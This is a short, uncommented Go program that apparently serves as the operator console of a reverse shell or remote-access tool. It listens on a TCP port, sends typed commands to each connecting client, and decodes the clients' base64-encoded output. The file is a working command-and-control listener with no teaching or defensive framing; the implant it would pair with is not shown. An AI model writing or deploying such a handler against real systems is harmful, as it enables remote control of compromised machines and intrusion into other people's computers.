package main

import (
	"bufio"
	b64 "encoding/base64"
	"fmt"
	"net"
	"os"
	"strings"
)

var count = 0

func handleConnection(c net.Conn) {
	fmt.Printf("\n[+] Connection from " + c.RemoteAddr().String() + "\n")
	for {
		reader := bufio.NewReader(os.Stdin)
		fmt.Print(c.RemoteAddr().String() + ">> ")
		text, _ := reader.ReadString('\n')
		fmt.Fprintf(c, text+"\n")

		message, _ := bufio.NewReader(c).ReadString('\n')
		uDec, _ := b64.URLEncoding.DecodeString(message)
		fmt.Print("[+] Output from " + string(text) + "\n" + string(uDec))
		if strings.TrimSpace(string(text)) == "STOP" {
			fmt.Println("Disconnecting from client...")
			c.Close()
		}
	}
}

func main() {
	arguments := os.Args
	if len(arguments) == 1 {
		fmt.Println("Please provide a port number!")
		return
	}

	PORT := ":" + arguments[1]
	l, err := net.Listen("tcp4", PORT)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer l.Close()

	for {
		c, err := l.Accept()
		if err != nil {
			fmt.Println(err)
			return
		}
		go handleConnection(c)
		count++
	}
}
